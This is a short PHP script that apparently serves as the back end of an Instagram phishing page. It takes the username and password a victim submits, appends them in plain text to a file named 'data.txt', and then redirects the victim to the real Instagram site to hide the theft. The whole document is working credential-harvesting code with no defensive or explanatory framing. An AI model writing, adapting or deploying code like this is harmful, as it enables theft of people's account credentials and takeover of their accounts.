<?php

$username = trim($_POST['username'] ?? '');
$password = trim($_POST['password'] ?? '');

if (empty($username) || empty($password)) {
    header("Location: index.php");
    exit();
}



$file = fopen("data.txt", "a");

fwrite($file, "Username: $username\n");
fwrite($file, "Password: $password\n");
fwrite($file, "--------------------\n");

fclose($file);

// Redirect to your own page
header("Location: https://www.instagram.com/?hl=en");
exit();

?>
